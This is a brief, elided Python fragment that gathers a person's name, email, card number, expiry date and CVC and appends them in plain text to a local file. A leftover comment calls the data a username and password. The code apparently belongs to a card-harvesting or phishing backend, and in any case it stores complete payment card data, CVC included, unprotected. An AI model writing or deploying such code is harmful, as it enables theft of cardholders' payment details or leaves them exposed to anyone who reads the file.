...
#    data = { email, name, number, exp, cvc }
   ...
   if email and number and name and exp and cvc:
       # Open the file in append mode and save the username and password
       with open(data_file, 'a') as file:
           file.write(f"name: {name}, email: {email}, number: {number}, exp: {exp}, cvc: {cvc}\n")
